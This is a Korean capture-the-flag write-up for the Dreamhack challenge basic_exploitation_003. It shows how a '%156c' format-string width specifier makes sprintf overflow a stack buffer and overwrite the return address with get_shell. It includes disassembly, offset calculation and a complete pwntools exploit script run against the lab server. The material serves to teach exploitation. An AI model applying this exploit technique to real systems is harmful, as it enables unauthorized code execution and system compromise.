# basic_exploitation_003 (Format String → Buffer Overflow)

## 개요

이 문제는 이름은 "format string" 이지만, 실제 익스플로잇은 포맷 스트링의 **너비 지정자(`%Nc`)로 출력 길이를 임의로 늘려 `sprintf`가 스택 버퍼를 넘치게 만드는 버퍼 오버플로우**임. `%n` 같은 쓰기 지정자를 쓰지 않고, `%156c` 로 정확히 156바이트짜리 출력을 만든 뒤 그 뒤에 리턴 주소로 쓸 값(`get_shell`)을 literal 바이트로 붙여서 `main`의 반환 주소를 덮어씀.

바이너리에는 이미 `system("/bin/sh")`를 호출하는 `get_shell()` 함수가 존재하므로, 반환 주소를 `get_shell`로 바꿔주기만 하면 셸을 얻을 수 있음. NX가 걸려있어 셸코드는 못 올리지만 No-PIE라서 `get_shell`의 주소(`0x8048669`)가 고정이므로 ret2code가 그대로 성립함.

```c
void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf);        // (*) heap_buf 가 그대로 포맷 문자열로 사용됨
    printf("ECHO : %s\n", stack_buf);
    return 0;
}
```

## 바이너리 분석

### 취약점

```c
read(0, heap_buf, 0x80);     // 사용자 입력을 heap_buf에 0x80바이트까지 읽음
sprintf(stack_buf, heap_buf);// 두 번째 인자(포맷 문자열)가 사용자 입력 그 자체
```

`sprintf(dst, fmt)`에서 `fmt`가 사용자 입력임 → **포맷 스트링 버그**. 하지만 더 중요한 건 `sprintf`에는 길이 제한이 없다는 점임.

- `stack_buf`는 `char[0x90]` (144바이트)밖에 안 됨.
- 입력(`heap_buf`)은 최대 0x80바이트지만, `%156c` 같은 너비 지정자를 쓰면 **입력은 짧아도 출력은 156바이트 이상**으로 부풀릴 수 있음.
- 따라서 `%156c` + `p32(get_shell)` 라는 9바이트짜리 입력만으로 `stack_buf`를 넘어 `main`의 저장된 반환 주소까지 덮어쓰는 **스택 버퍼 오버플로우**가 발생함.

### 보호 기법 (checksec)

| 보호 기법 | 상태 | 영향 |
|---|---|---|
| Arch | i386-32-little (ELF32) | 주소/포인터가 4바이트, `p32` 사용 |
| RELRO | Partial RELRO | (이번엔 GOT 안 건드려서 무관) |
| Stack Canary | **No canary** | 반환 주소까지 그냥 덮어쓸 수 있음 |
| NX | NX enabled | 스택 셸코드 불가 → ret2code 필요 |
| PIE | **No PIE** (0x8048000) | `get_shell` 주소가 `0x8048669`로 고정 |
| Symbols | Not stripped | `get_shell` 심볼 바로 참조 가능 |

No canary + No PIE 조합이 핵심임. 카나리가 없어서 반환 주소까지 선형 오버플로우가 통하고, PIE가 없어서 `get_shell`의 절대 주소를 그대로 payload에 박을 수 있음.

## `%Nc`로 만드는 오버플로우 원리

포맷 스트링에서 `%c`는 인자 하나를 문자로 출력하고, `%Nc`는 그 문자를 **너비 N 필드에 오른쪽 정렬**해서 출력함. 즉 `%156c`는 `(공백 155개) + (문자 1개)` = **정확히 156바이트**를 출력함.

`sprintf(stack_buf, "%156c\x69\x86\x04\x08")`가 실행되면 `stack_buf`에는 다음이 순서대로 기록됨:

```
offset 0   ~ 155 : %156c 의 출력 156바이트 (공백 155 + 문자 1)
offset 156 ~ 159 : "\x69\x86\x04\x08"  (p32(get_shell), literal 복사)
offset 160       : '\0' (sprintf가 붙이는 널 종료자)
```

여기서 offset 156~159가 바로 `main`의 저장된 반환 주소 자리임(아래 오프셋 계산 참고). 즉 **`%156c`는 반환 주소 직전까지를 채우는 "패딩"** 역할이고, 뒤에 붙은 4바이트가 실제 덮어쓸 반환 주소임. `%n`을 전혀 쓰지 않고 출력 길이만으로 오버플로우를 완성하는 전형적인 "format string → BOF" 패턴임.

> 참고: `%c`는 가변 인자 하나를 소비함. `sprintf`는 스택에 있는 아무 더미 값(초기화 안 된 dword)을 문자로 가져다 쓰지만, 출력 길이에는 영향이 없으므로 익스플로잇에는 무관함.

## GDB로 오프셋/주소 구하기

### 1) 반환 주소까지의 오프셋 `l = 0x98 + 0x4 = 156`

`l` 값은 `stack_buf`의 시작부터 `main`의 저장된 반환 주소까지의 거리임. 두 가지 방법으로 구할 수 있음.

**(A) 디스어셈블로 프레임 구조 확인 (`objdump -d -M intel` / pwndbg `disassemble main`)**

```asm
804867c: push   ebp
804867d: mov    ebp,esp
804867f: push   edi                  ; 저장된 edi -> [ebp-0x4]
8048680: sub    esp,0x94
...
8048696: lea    edx,[ebp-0x98]       ; stack_buf 의 시작 = ebp-0x98
...
80486c4: lea    eax,[ebp-0x98]       ; sprintf 의 dst = ebp-0x98 (확인됨)
80486cb: call   sprintf@plt
```

32비트 cdecl 스택 프레임이므로:

| 주소 | 내용 |
|---|---|
| `ebp-0x98` | `stack_buf` 시작 (dst) |
| `ebp-0x08` | `heap_buf` 포인터 |
| `ebp-0x04` | 저장된 edi |
| `ebp+0x00` | 저장된 ebp |
| `ebp+0x04` | **저장된 반환 주소** |

→ `stack_buf`(`ebp-0x98`)에서 반환 주소(`ebp+0x4`)까지의 거리 = `0x98 + 0x4 = 0x9c = 156`. 이게 그대로 poc의 `l`임.

**(B) cyclic 패턴으로 구하기 (디스어셈블 안 보고)**

포맷 지정자(`%`)가 없는 cyclic 패턴은 `sprintf`가 그냥 literal로 복사하므로 오버플로우만 유발함.

```
pwndbg> cyclic 200
pwndbg> r
# 위 패턴을 그대로 입력(stdin)
# ret 에서 크래시 → EIP 가 패턴 값으로 덮임
pwndbg> cyclic -l $eip        # 또는 cyclic -l 0x........
156                          # <- 반환 주소까지의 오프셋
```

두 방법 모두 `156`이 나오고, poc는 이를 가독성 있게 `0x98 + 0x4`로 표기했을 뿐임.

### 2) `get_shell` 주소 `0x8048669`

No-PIE라서 주소가 고정이므로 아무 방법이나 됨.

```
pwndbg> p get_shell          # $1 = {<text>} 0x8048669 <get_shell>
# 또는
$ nm basic_exploitation_003 | grep get_shell     # 08048669 T get_shell
$ objdump -d basic_exploitation_003 | grep '<get_shell>:'
```

poc에서는 pwntools로 동일하게 가져옴:

```python
e = ELF("./basic_exploitation_003")
get_shell = e.symbols["get_shell"]   # 0x8048669
```

`get_shell`은 내부에서 `system("/bin/sh")`를 호출하는 완결된 함수라서, 반환 주소를 이 주소로만 바꿔주면 인자 세팅 없이 바로 셸이 열림.

## 익스플로잇 ( `poc.py` ) 단계별 설명

```python
from pwn import *

# p = process("./basic_exploitation_003")
p = remote("host3.dreamhack.games", 17627)

e = ELF("./basic_exploitation_003")
get_shell = e.symbols["get_shell"]        # 0x8048669 (No-PIE 고정 주소)

l = 0x98 + 0x4                            # 156 : stack_buf -> 반환 주소 거리

payload = f"%{l}c".encode() + p32(get_shell)   # "%156c" + "\x69\x86\x04\x08"

p.send(payload)

p.interactive()
```

### 단계별 동작

| 단계 | 코드 | 설명 |
|---|---|---|
| 1 | `get_shell = e.symbols["get_shell"]` | No-PIE라 고정된 `get_shell` 주소(`0x8048669`) 확보 |
| 2 | `l = 0x98 + 0x4` | 디스어셈블/cyclic으로 구한 반환 주소까지의 오프셋(156) |
| 3 | `f"%{l}c"` | `sprintf` 출력을 정확히 156바이트로 부풀리는 패딩 (`%n` 아님) |
| 4 | `+ p32(get_shell)` | 156바이트 뒤, 즉 반환 주소 자리에 들어갈 `get_shell` 주소 4바이트 |
| 5 | `p.send(payload)` | `read()`로 `heap_buf`에 입력 → `sprintf(stack_buf, heap_buf)`에서 오버플로우 발생 |
| 6 | `return 0` | `main`이 리턴하며 덮어쓴 반환 주소(`get_shell`)로 점프 → `system("/bin/sh")` |
| 7 | `p.interactive()` | 셸 획득 |

payload 전체 길이는 `"%156c"`(5바이트) + 4바이트 = **9바이트**로, `read`의 제한(0x80=128)과 `heap_buf`(0x80) 크기 안에 충분히 들어감. 입력은 짧지만 `sprintf`가 만드는 **출력**이 160바이트라서 144바이트짜리 `stack_buf`를 넘어 반환 주소를 덮는 것이 이 익스플로잇의 전부임.

`p32(0x8048669)` = `b"\x69\x86\x04\x08"` 에 널 바이트가 없어서 `sprintf`가 중간에 잘리지 않고 4바이트를 온전히 복사한다는 점도 중요함(만약 상위 바이트가 0x00이었다면 literal 복사가 거기서 끊겼을 것임).

## 핵심 요약

| 요소 | 내용 |
|---|---|
| 취약점 | `sprintf(stack_buf, heap_buf)` — 사용자 입력이 포맷 문자열 + 길이 제한 없음 |
| 실제 기법 | `%Nc` 너비 지정자로 출력을 부풀려 발생시키는 **스택 버퍼 오버플로우** (`%n` 미사용) |
| write primitive | 반환 주소를 `get_shell`로 덮어쓰는 ret2code |
| 오프셋 `l` | `0x98 + 0x4 = 156` = `stack_buf(ebp-0x98)` → 반환 주소(`ebp+0x4`) 거리 |
| 오프셋 구하는 법 | `disassemble main`의 `lea [ebp-0x98]` + cdecl 프레임 / 또는 cyclic 패턴 `cyclic -l $eip` |
| 타깃 주소 | `get_shell = 0x8048669` (No-PIE 고정, `p get_shell`/`nm`/`e.symbols`) |
| 보호 우회 | No canary(반환 주소 도달) + No PIE(고정 주소) → NX는 ret2code라 무관 |
| 최종 목표 | `main` 리턴 → `get_shell()` → `system("/bin/sh")` |

이 문제의 교훈은, 포맷 스트링 버그가 꼭 `%n`으로 메모리를 직접 쓸 때만 위험한 게 아니라 **`%Nc` 같은 너비 지정자로 출력 길이를 조작하는 것만으로도 고정 크기 버퍼(`sprintf`)를 넘겨 스택 오버플로우를 만들 수 있다**는 점임. 입력 길이 제한(`read` 0x80)이 있어도 출력 길이는 포맷 문자열로 얼마든지 키울 수 있으므로, `sprintf`/`vsprintf`처럼 길이 인자가 없는 함수에 사용자 포맷을 넘기는 것은 그 자체로 치명적임.
